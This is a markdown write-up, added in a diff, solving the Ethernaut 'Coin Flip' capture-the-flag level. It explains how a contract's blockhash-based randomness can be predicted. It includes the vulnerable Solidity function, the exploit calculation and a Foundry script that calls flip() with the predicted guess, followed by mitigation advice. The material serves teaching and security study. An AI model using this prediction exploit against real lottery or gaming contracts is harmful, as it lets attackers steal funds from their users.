@@ -1,0 +1,202 @@
+# Ethernaut Level 3 – Coin Flip
+
+## Overview
+
+The objective of this challenge is to make the `consecutiveWins` state variable reach **10** by correctly predicting the outcome of the coin flip every time.
+
+At first glance, the contract appears to generate a random coin flip using the previous block hash. However, this randomness is completely predictable because all block data is publicly available on-chain.
+
+---
+
+# Vulnerable Contract
+
+```solidity
+function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+        revert();
+    }
+
+    lastHash = blockValue;
+
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+        consecutiveWins++;
+        return true;
+    } else {
+        consecutiveWins = 0;
+        return false;
+    }
+}
+```
+
+---
+
+# Root Cause
+
+The contract relies on:
+
+```solidity
+blockhash(block.number - 1)
+```
+
+as its source of randomness.
+
+This is **not random**.
+
+Every transaction executed in the current block can read exactly the same previous block hash before calling the vulnerable function.
+
+Since the attacker has access to the same value as the contract, they can perform the exact same calculation and always know the correct answer before submitting the transaction.
+
+---
+
+# Understanding the Randomness
+
+The contract computes:
+
+```solidity
+uint256 blockValue = uint256(blockhash(block.number - 1));
+```
+
+Then it divides that value by:
+
+```solidity
+FACTOR =
+57896044618658097711785492504343953926634992332820282019728792003956564819968;
+```
+
+which is equal to:
+
+```
+2²⁵⁵
+```
+
+Dividing by `2²⁵⁵` extracts only the most significant bit of the 256-bit block hash.
+
+Therefore:
+
+```
+block hash
+↓
+
+256-bit integer
+↓
+
+divide by 2²⁵⁵
+↓
+
+0 or 1
+↓
+
+false or true
+```
+
+So the coin flip is simply determined by the highest bit of the previous block hash.
+
+---
+
+# Exploit
+
+The exploit performs the exact same calculation before calling `flip()`.
+
+```solidity
+uint256 blockValue = uint256(blockhash(block.number - 1));
+
+bool guess =
+    (blockValue / FACTOR) == 1;
+
+coinflipInstance.flip(guess);
+```
+
+Because both the attacker and the vulnerable contract execute during the same block, they both read the exact same value returned by:
+
+```solidity
+blockhash(block.number - 1)
+```
+
+As a result, the prediction is always correct.
+
+---
+
+# Why `lastHash` Exists
+
+The contract also contains:
+
+```solidity
+if (lastHash == blockValue) {
+    revert();
+}
+```
+
+This prevents multiple successful calls using the same block hash.
+
+Without this check, an attacker could repeatedly call `flip()` within a single block and increase `consecutiveWins` indefinitely.
+
+Instead, the challenge requires one successful prediction per block until ten consecutive wins are achieved.
+
+---
+
+# Security Impact
+
+Using blockchain properties as a randomness source is insecure because they are deterministic and publicly accessible.
+
+An attacker can predict values derived from:
+
+* `blockhash`
+* `block.number`
+* `block.timestamp`
+* `block.prevrandao` (depending on use case)
+
+This can completely break:
+
+* Lottery contracts
+* NFT mint randomness
+* On-chain games
+* Gambling protocols
+* Prize distributions
+
+---
+
+# Recommended Mitigation
+
+Never rely on block variables as a randomness source.
+
+Instead, use a verifiable randomness oracle such as **Chainlink VRF**, which provides cryptographically secure random numbers that cannot be predicted or manipulated by users.
+
+---
+
+# Key Takeaways
+
+* Blockchain data is deterministic, not random.
+* `blockhash(block.number - 1)` is publicly accessible.
+* Any contract or external caller can reproduce the exact same calculation.
+* Weak randomness allows attackers to predict outcomes with 100% accuracy.
+* Secure randomness should always come from a trusted randomness oracle like Chainlink VRF.
+
+---
+
+# Exploit Summary
+
+```solidity
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    uint256 blockValue =
+        uint256(blockhash(block.number - 1));
+
+    bool guess =
+        (blockValue / FACTOR) == 1;
+
+    coinflipInstance.flip(guess);
+
+    vm.stopBroadcast();
+}
+```
+
+This exploit reproduces the exact calculation performed by the vulnerable contract, allowing every flip to be predicted correctly.
